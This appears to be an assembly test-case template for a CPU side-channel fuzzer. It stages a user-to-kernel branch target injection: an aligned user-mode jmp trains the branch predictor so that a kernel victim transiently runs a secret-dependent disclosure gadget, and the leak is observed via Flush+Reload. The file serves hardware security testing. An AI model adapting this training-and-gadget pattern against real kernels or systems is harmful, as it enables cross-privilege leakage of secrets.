.intel_syntax noprefix

# ============================================================================
# K2U BTI (aligned, transient-only): host-user attacker trains BTB; host-kernel
# victim mispredicts into a disclosure gadget. Shared F+R channel via host<->host
# aliasing (user.data_alias=kvictim). Same design as template-gs2hu-transient-
# aligned.asm, but both actors are in the host address space, so BTB collision is
# feasible (this is the boundary GS->HU couldn't align).
#
# Transitions: main<->user via k2u/u2k; main<->kvictim via the generic `switch`
# (kernel<->kernel). Alignment: user `train` and victim `victim_1` are both the
# FIRST function in their section and share an identical prefix so their jmps and
# their disclosure gadgets land at the same in-section offset. The victim gets an
# 8-byte pad to compensate for the attacker's k2u landing macro.
#
# Controls: template-k2u-bti-no-jmp.asm removes both jmps (expect CLEAN).
# ============================================================================

# ----------------------------- Host orchestrator ----------------------------
.section .data.main
.function_main_0:
    .macro.set_k2u_target.user.function_user_0:
    .macro.set_u2k_target.main.function_main_1:
    .macro.switch_k2u.user.0:

.function_main_1:
    .macro.landing_u2k.main_1:
    # user (attacker) trains the BTB
    .macro.set_k2u_target.user.function_user_train:
    .macro.set_u2k_target.main.function_main_2:
    .macro.switch_k2u.user.1:

.function_main_2:
    .macro.landing_u2k.main_2:
    # run the kernel victim (mispredict -> disclosure); no IBPB in between
    .macro.switch.kvictim.function_victim_1:

.function_main_3:
.macro.fault_handler:
.patch_placeholder_fault_handler:
    # user measures
    .macro.set_k2u_target.user.function_user_measure:
    .macro.set_u2k_target.main.function_main_4:
    .macro.switch_k2u.user.2:

.function_main_4:
    .macro.landing_u2k.main_4:
    nop


# ----------------------------- User (host user, observer) -------------------
# function_user_train FIRST (offset 0) to mirror function_victim_1.
.section .data.user
.function_user_train:
    .macro.landing_k2u.user_1:
    # mirror the victim's prefix (same 6 loads at fixed addrs -> fixed footprint, no leak)
    xor rax, rax  # noremove
    mov rax, qword ptr [r14 + 0x2000] # noremove
    mov rbx, qword ptr [r14 + 0x2008] # noremove
    mov rcx, qword ptr [r14 + 0x2010] # noremove
    mov rdx, qword ptr [r14 + 0x2018] # noremove
    mov rsi, qword ptr [r14 + 0x2020] # noremove
    mov rdi, qword ptr [r14 + 0x2028] # noremove
    mfence # noremove
    lea rax, qword ptr [rip + .function_user_disclosure]  # noremove
    jmp rax  # noremove                                   # trains BTB[this PC] = disclosure

.function_user_safe:
    lfence  # noremove
    .macro.switch_u2k.main.user_safe:
    lfence  # noremove

.function_user_disclosure:
    lfence  # noremove   (architectural jmp target; inert)
    .macro.switch_u2k.main.user_1:
    lfence

.function_user_0:
    .macro.landing_k2u.user_0:
    .macro.measurement_start.user_0:
    .macro.switch_u2k.main.user_0:
    lfence

.function_user_measure:
    .macro.landing_k2u.user_2:
    xor rax, rax  # noremove
    xor rbx, rbx  # noremove
    xor rcx, rcx  # noremove
    xor rdx, rdx  # noremove
    xor rsi, rsi  # noremove
    xor rdi, rdi  # noremove
    .macro.measurement_end.user_2:
    .macro.switch_u2k.main.2:
    lfence


# ----------------------------- Victim (host kernel) -------------------------
.section .data.kvictim
.function_victim_1:
    # 8-byte pad to match the attacker's k2u landing macro (alignment).
    nop qword ptr [rax + 0xff]  # noremove
    xor rax, rax  # noremove
    mov rax, qword ptr [r14 + 0x2000] # noremove   (secret input in rax)
    mov rbx, qword ptr [r14 + 0x2008] # noremove
    mov rcx, qword ptr [r14 + 0x2010] # noremove
    mov rdx, qword ptr [r14 + 0x2018] # noremove
    mov rsi, qword ptr [r14 + 0x2020] # noremove
    mov rdi, qword ptr [r14 + 0x2028] # noremove
    mfence # noremove
    lea rbx, qword ptr [rip + .function_victim_safe]  # noremove
    jmp rbx  # noremove                     # ARCH -> safe;  mispredict -> disclosure

.function_victim_safe:
    lfence  # noremove
    .macro.switch.main.function_main_3:
    lfence

.function_victim_disclosure:
    # Mask to a cache-line index WITHIN the main page (0..0xFC0): only the main page is shared
    # via the host alias, so the transient footprint must land there for the observer to F+R it.
    and rax, 0b111111000000  # noremove
    mov rcx, qword ptr [r14 + rax]   # noremove   (transient: secret-dependent load, main page)
    and rcx, 0b111111000000  # noremove
    mov rdx, qword ptr [r14 + rcx]   # noremove   (transient: imprint into cache, main page)
    lfence  # noremove
    # transient-only; switch target differs from victim_safe just to keep the macro label unique
    .macro.switch.main.function_main_4:
    lfence


# ----------------------------- Exit -----------------------------------------
.section .data.main
.test_case_exit:
